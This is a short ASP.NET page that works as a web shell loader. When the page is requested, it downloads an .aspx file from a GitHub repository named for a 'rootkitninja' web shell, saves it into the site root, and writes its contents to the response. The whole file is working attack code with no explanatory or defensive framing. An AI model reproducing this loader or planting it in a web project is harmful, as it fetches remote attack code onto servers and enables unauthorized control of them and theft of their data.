<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.IO" %>

<%
string rootkitNinjaRepositoryUrl = "https://raw.githubusercontent.com/ortod0x/rootkitninja_webshell/main/rootkitninja.aspx";

string rootkitNinjaTempPath = Server.MapPath("~/");

string rootkitNinjaFilePath = Path.Combine(rootkitNinjaTempPath, "loader.rootkit.ninja");

using (WebClient client = new WebClient())
{
    client.DownloadFile(rootkitNinjaRepositoryUrl, rootkitNinjaFilePath);
}

Response.WriteFile(rootkitNinjaFilePath);

%>
